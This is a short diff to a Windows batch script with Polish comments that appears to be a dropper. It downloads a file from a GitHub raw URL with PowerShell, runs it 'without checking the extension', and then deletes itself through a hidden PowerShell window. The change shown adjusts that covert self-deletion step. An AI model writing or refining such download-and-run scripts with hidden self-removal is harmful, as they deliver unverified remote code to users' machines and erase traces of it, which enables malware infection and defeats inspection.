@@ -17,7 +17,5 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/p
 :: Uruchom bez sprawdzania rozszerzenia
 start "" "%DEST%\%FILE%"
 
-:: Usuń plik .bat po 10 sekundach
-
-powershell -WindowStyle Hidden -Command "Start-Sleep -Milliseconds 100; Remove-Item '%~f0' -Force"
-
+:: Wydziel samousuwanie do osobnego procesu, aby nie blokować pliku .bat
+powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item '%~f0' -Force" & exit
